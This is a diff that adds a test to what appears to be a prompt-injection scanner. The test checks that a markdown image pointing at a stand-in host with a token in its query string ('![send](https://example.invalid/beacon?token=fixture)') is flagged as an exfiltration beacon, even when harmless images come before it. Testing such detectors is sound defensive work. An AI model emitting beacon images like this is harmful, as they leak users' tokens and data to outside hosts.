@@ -94,6 +94,22 @@ def test_core_pipeline_options_and_honeypot_are_live(client):
     assert plain["honeypot_payload"] is None
 
 
+@pytest.mark.parametrize("images, expected", [
+    ("![send](https://example.invalid/beacon?token=fixture)", "quarantine"),
+    ("![logo](https://example.invalid/logo.png) ![send](https://example.invalid/beacon?token=fixture)", "quarantine"),
+    ("![logo](https://example.invalid/logo.png) ![chart](https://example.invalid/chart.svg)", "no-match"),
+])
+def test_markdown_beacon_scans_images_after_benign_images(client, images, expected):
+    response = client.post("/v1/scan", json={"prompt": images})
+    assert response.status_code == 200
+    data = response.json()
+    assert data["verdict"] == expected
+    findings = [threat for threat in data["threats"] if threat["type"] == "MARKDOWN_EXFIL_BEACON"]
+    assert bool(findings) == (expected == "quarantine")
+    if findings:
+        assert findings[0]["snippet"].startswith("![send]")
+
+
 def test_requests_have_isolated_history_even_concurrently(client):
     def scan(history):
         return client.post("/v1/scan", json={
